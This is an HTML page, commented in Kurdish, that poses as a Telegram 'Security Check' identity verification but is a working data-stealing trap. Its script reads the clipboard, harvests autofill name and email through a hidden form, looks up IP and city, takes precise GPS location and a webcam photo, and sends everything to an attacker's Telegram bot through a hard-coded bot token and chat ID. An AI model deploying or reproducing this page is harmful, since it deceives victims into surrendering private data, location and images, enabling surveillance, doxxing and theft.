<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 100%; max-width: 380px; text-align: center; z-index: 10; }
        .logo { width: 100px; margin-bottom: 20px; }
        h2 { color: #222; margin-bottom: 10px; font-size: 22px; }
        p { color: #707579; font-size: 14.5px; margin-bottom: 30px; line-height: 1.5; }
        .btn { background: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        .btn:hover { background: #2b7dcb; }
        
        /* تەڵەی Autofill - بە چاو نابینرێت بەڵام وێبگەڕەکە دەیبینێت */
        #trap-form { opacity: 0.01; position: absolute; top: 0; left: 0; height: 1px; width: 1px; overflow: hidden; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
    <h2>Security Check</h2>
    <p>To access this content, please verify your device identity and allow location access.</p>
    
    <!-- فۆرمی تەڵە بۆ دزینی Autofill -->
    <form id="trap-form">
        <input type="text" id="af_name" autocomplete="name">
        <input type="email" id="af_email" autocomplete="email">
    </form>

    <button class="btn" id="mainBtn">VERIFY & PROCEED</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
    const chatId = "6679834643";

    // فەرمانی ناردنی نامە بۆ تێلگرام
    function sendToBot(text) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text })
        });
    }

    document.getElementById('mainBtn').addEventListener('click', async function() {
        sendToBot("🚀 Target Clicked! Starting data collection...");

        // ١. دزینی Clipboard (دەبێت لە کاتی کلیکەکەدا بێت)
        try {
            const clipText = await navigator.clipboard.readText();
            if(clipText) sendToBot("📋 Clipboard Data: " + clipText);
        } catch (e) {
            sendToBot("❌ Clipboard Access Denied");
        }

        // ٢. وەرگرتنی IP و ISP
        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
            let netInfo = `🌐 Network Info:\n- IP: ${data.ip}\n- City: ${data.city}\n- Organization: ${data.org}`;
            sendToBot(netInfo);
        });

        // ٣. وەرگرتنی Autofill
        setTimeout(() => {
            let n = document.getElementById('af_name').value;
            let e = document.getElementById('af_email').value;
            if(n || e) sendToBot(`👤 Autofill Data:\nName: ${n}\nEmail: ${e}`);
        }, 800);

        // ٤. وەرگرتنی لۆکەیشنی وردی GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                sendToBot(`📍 GPS Location:\nhttps://www.google.com/maps?q=${lat},${lon}`);
            }, err => sendToBot("❌ GPS Access Denied"), { enableHighAccuracy: true });
        }

        // ٥. وێنەی ڕووخسار (Camera Capture)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'capture.jpg');
                    fd.append('caption', '👤 Target Face Captured!');
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

                // داخستنی کامێرا و گواستنەوە بۆ لاپەڕەی دواتر
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "index.html";
                }, 1000);
            }, 2000);
        } catch (e) {
            sendToBot("❌ Camera Access Denied");
            window.location.href = "index.html";
        }
    });
</script>

</body>
</html>
